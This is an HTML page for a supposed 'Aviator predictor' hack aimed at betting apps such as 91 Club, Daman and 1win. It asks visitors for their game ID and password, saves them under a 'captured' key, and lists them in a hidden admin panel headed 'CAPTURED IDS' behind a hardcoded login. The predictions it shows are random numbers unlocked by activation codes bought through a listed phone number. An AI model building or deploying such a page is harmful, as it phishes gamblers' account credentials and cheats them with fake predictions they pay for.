<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KADIR 786 | MASTER HACK v5.0</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; padding: 0; }
        
        /* 1. ADMIN PANEL (TOP) */
        .admin-header { background: #000; border-bottom: 2px solid #00ff41; padding: 10px; }
        .adm-row { display: flex; gap: 5px; }
        .adm-field { background: #111; border: 1px solid #333; color: #00ff41; padding: 10px; border-radius: 5px; width: 35%; }
        #admLogs { display: none; background: #050505; padding: 10px; border: 1px dashed #00ff41; margin-top: 10px; }

        /* 2. USER LOGIN */
        .container { padding: 20px; text-align: center; }
        .u-field { width: 100%; max-width: 350px; padding: 15px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 10px; margin-bottom: 15px; box-sizing: border-box; }
        .btn-blue { width: 100%; max-width: 350px; padding: 15px; background: #007bff; color: #fff; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; }

        /* 3. CLUB GRID */
        #clubGrid { display: none; padding: 20px; grid-template-columns: 1fr 1fr; gap: 15px; }
        .club-card { background: #1a1a1a; border: 1px solid #ffae00; border-radius: 15px; padding: 20px; cursor: pointer; position: relative; background-size: cover; min-height: 80px; }

        /* 4. AVIATOR PREDICTOR PAGE (The Real One) */
        #predPage { display: none; text-align: center; padding: 20px; }
        .mult-display { font-size: 75px; font-weight: bold; margin: 30px 0; color: #fff; text-shadow: 0 0 20px red; }
        .btn-red { background: #b30000; color: #fff; width: 100%; max-width: 320px; padding: 15px; border: none; border-radius: 10px; font-weight: bold; margin-bottom: 10px; cursor: pointer; }
        
        .support { margin-top: 20px; padding: 15px; background: #111; border-radius: 10px; }
        table { width: 100%; font-size: 11px; color: #00ff41; border-collapse: collapse; }
        th, td { border: 1px solid #222; padding: 5px; }
    </style>
</head>
<body>

<div class="admin-header">
    <div id="admLoginBox" class="adm-row">
        <input type="text" id="aID" class="adm-field" placeholder="Kadir 786">
        <input type="password" id="aPass" class="adm-field" placeholder="9580">
        <button onclick="loginAdm()" style="background:#00ff41; border:none; border-radius:5px; flex-grow:1; font-weight:bold;">LOGIN</button>
    </div>
    <div id="admLogs">
        <h4 style="margin:0 0 10px 0;">CAPTURED IDS:</h4>
        <table id="logTable"><thead><tr><th>ID</th><th>PASS</th><th>TIME</th></tr></thead><tbody id="logBody"></tbody></table>
        <button onclick="genKey()" style="background:#ffae00; border:none; padding:10px; margin-top:10px; border-radius:5px; font-weight:bold;">GENERATE ACTIVATION KEY</button>
        <p id="showKey" style="color:yellow; font-weight:bold;"></p>
    </div>
</div>

<div class="container">
    <div id="userLogin">
        <h2>KADIR 786</h2>
        <p style="color:#888;">Enter Old Game ID to Start Hack</p>
        <input type="text" id="uMail" class="u-field" placeholder="Old Game ID/Email">
        <input type="password" id="uPw" class="u-field" placeholder="Game Password">
        <button class="btn-blue" onclick="userAuth()">LOGIN & ACTIVATE</button>
    </div>

    <div id="clubGrid">
        <div class="club-card" onclick="openHack('91 Club')"><h4>91 Club</h4></div>
        <div class="club-card" onclick="openHack('55 Club')"><h4>55 Club</h4></div>
        <div class="club-card" onclick="openHack('Daman')"><h4>Daman</h4></div>
        <div class="club-card" onclick="openHack('1win')"><h4>1win</h4></div>
    </div>

    <div id="predPage">
        <h2 id="clubName" style="color:red; margin:0;">AVIATOR PREDICTOR v5.0</h2>
        <div class="mult-display" id="result">1.00x</div>
        
        <input type="text" id="activeKey" class="u-field" placeholder="Enter Activation Code">
        <button class="btn-red" onclick="getSignal()">GET PREDICTION</button>
        
        <div class="support">
            <p style="color:#888; font-size:12px;">Contact Admin for Code:</p>
            <a href="tel:9554527334" style="color:#ffae00; font-size:20px; text-decoration:none; font-weight:bold;">📞 9554527334</a>
        </div>
    </div>
</div>

<script>
    let keys = JSON.parse(localStorage.getItem('myKeys')) || [];

    function loginAdm() {
        if(document.getElementById('aID').value === "Kadir 786" && document.getElementById('aPass').value === "9580") {
            document.getElementById('admLogs').style.display = 'block';
            loadLogs();
        } else { alert("Access Denied"); }
    }

    function genKey() {
        let k = "KDR-" + Math.floor(Math.random()*9000+1000);
        keys.push(k);
        localStorage.setItem('myKeys', JSON.stringify(keys));
        document.getElementById('showKey').innerText = "New Key: " + k;
    }

    function userAuth() {
        let e = document.getElementById('uMail').value;
        let p = document.getElementById('uPw').value;
        if(e && p) {
            let logs = JSON.parse(localStorage.getItem('captured')) || [];
            logs.push({e, p, t: new Date().toLocaleTimeString()});
            localStorage.setItem('captured', JSON.stringify(logs));
            document.getElementById('userLogin').style.display = 'none';
            document.getElementById('clubGrid').style.display = 'grid';
        } else { alert("Fill Details!"); }
    }

    function loadLogs() {
        let logs = JSON.parse(localStorage.getItem('captured')) || [];
        let h = "";
        logs.forEach(l => h += `<tr><td>${l.e}</td><td>${l.p}</td><td>${l.t}</td></tr>`);
        document.getElementById('logBody').innerHTML = h;
    }

    function openHack(name) {
        document.getElementById('clubGrid').style.display = 'none';
        document.getElementById('predPage').style.display = 'block';
        document.getElementById('clubName').innerText = name + " Predictor v5.0";
    }

    function getSignal() {
        let k = document.getElementById('activeKey').value;
        if(keys.includes(k)) {
            document.getElementById('result').innerText = "WAIT...";
            setTimeout(() => {
                document.getElementById('result').innerText = (Math.random() * 3 + 1.2).toFixed(2) + "x";
            }, 1500);
        } else { alert("Invalid Code! Contact Admin."); }
    }
</script>
</body>
</html>
